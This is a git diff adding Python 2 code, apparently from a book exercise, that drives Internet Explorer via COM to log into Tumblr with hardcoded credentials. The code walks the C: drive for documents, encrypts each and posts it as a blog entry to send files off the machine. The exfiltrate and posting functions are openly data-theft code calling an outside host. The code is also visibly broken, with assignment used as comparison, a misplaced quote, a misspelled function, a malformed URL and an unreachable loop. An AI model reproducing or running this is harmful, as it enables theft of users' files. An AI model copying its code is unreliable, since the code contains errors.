@@ -7,7 +7,6 @@ username = "jms@bughunter.ca"
 password = "justinBHP2014"
 public_key = ""
 
-
 def banner():
 	print "[***]	IE COM automation p129	[***]"
 
@@ -47,11 +46,63 @@ def random_sleep():
 	time.sleep(random.randing(5,10))
 	return
 
-def login_to_tumblr():
+def login_to_tumblr(ie):
+	full_doc = ie.Document.all
+	for i in full_doc:
+		if i.id = "signup_email":
+			i.setAttribute("value", username)
+		elif i.id == "signup_password":
+			i.setAttribute("value, password")
+	random_sleep()
+	wait_for_browser(ie)
+	return
 
-def psot_to_tumblr():
+def post_to_tumblr(ie,title,post):
+	full_doc = ie.Document.all
+	for i in full_doc:
+		if i.id == "post_one":
+			i.setAttribute("value", title)
+			title_box = i
+			i.focus()
+		elif i.id =- "post_two":
+			i.setAttribute("innerHTML", post)
+			print "Set text area"
+			i.focus()
+		elif i.id == "create_post":
+			print "Found post button"
+			post_form = i 
+			i.focus()
+	random_sleep()
+	title_box.focus()
+	random_sleep()
+	post_form.children[0].click()
+	wait_for_browser(ie)
+	random_sleep()
+	return
 
-def exfiltrate():
+def exfiltrate(document_path):
+	ie = win32com.client.Dispatch("InternetExplorer.Application")
+	ie.Visible = 1
+	ie.Navigate("http://www.tumblr.com/login")
+	wait_for_browser(ie)
+	print "Logging in..."
+	login_to_tumblr(ie)
+	print "Loggin in ...navigating"
+	ie.Navigate("https:///www.tumblr.com/new/text")
+	wait_for_browser(ie)
+	title, body = encrypt_post(document_path)
+	print "Creating new post..."
+	post_to_tumblr(ie,title,body)
+	print "Posted!"
+	ie.Quit()
+	ie = None
+	return
+	for parent, directories, filenames in os.walk("C:\\"):
+		for filename in fnmatch.filter(filenames, "*%s" % doc_type):
+			document_path = os.path.join(parent, filename)
+			print "Found: %s" % document_path
+			exfiltrate(document_path)
+			raw_input("Continue?")
 
 def main():
 
